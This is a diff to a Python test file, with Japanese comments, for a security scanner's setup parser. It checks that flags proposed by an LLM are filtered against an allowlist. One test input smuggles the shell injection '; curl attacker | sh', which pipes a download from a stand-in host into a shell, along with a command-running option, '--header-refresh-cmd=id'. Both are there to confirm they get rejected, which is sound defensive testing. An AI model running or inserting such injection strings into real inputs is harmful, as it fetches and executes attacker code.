@@ -3,8 +3,13 @@
 `main._parse_setup_llm` は純粋関数。妥当な JSON → 提案 dict、壊れた/未知のみ/空 → None
 （呼び出し側 run_setup は None のとき明示的にヒューリスティックへ倒す）。
 """
+import subprocess
+import sys
+from pathlib import Path
+
 from main import _parse_setup_llm
 
+_REPO_ROOT = Path(__file__).resolve().parent.parent
 KNOWN = {"sqli", "xss", "os", "ssti", "jwt", "graphql", "privesc"}
 
 
@@ -58,7 +63,21 @@ def test_flags_allowlist_only_safe_toggles():
     # 注入・値がシェル実行される option・任意の値付き option を排除（#170 P2）。
     out = _parse_setup_llm(
         '{"checks": ["os"], "flags": ["; curl attacker | sh", "--dom-xss", '
-        '"--header-refresh-cmd=id", "--llm=claude", "--spa-crawl"]}',
+        '"--header-refresh-cmd=id", "--llm=claude", "--no-headless", "--spa-crawl"]}',
         KNOWN,
     )
-    assert out["flags"] == ["--dom-xss", "--spa-crawl"]  # 許可リスト外は全て落とす
+    # 許可リスト外（注入/値付き/scan に無い --no-headless）は全て落とす
+    assert out["flags"] == ["--dom-xss", "--spa-crawl"]
+
+
+def test_safe_setup_flags_all_exist_on_scan_parser():
+    """許可リストの flag が実在の scan オプションであることを保証する（#170 P2 の再発防止）。"""
+    import re
+    from main import _SAFE_SETUP_FLAGS
+    help_txt = subprocess.run(
+        [sys.executable, "main.py", "scan", "--help"],
+        capture_output=True, text=True, cwd=_REPO_ROOT,
+    ).stdout
+    present = set(re.findall(r"--[a-z][a-z0-9-]*", help_txt))
+    missing = sorted(f for f in _SAFE_SETUP_FLAGS if f not in present)
+    assert not missing, f"scan に無い flag が許可リストにある: {missing}"
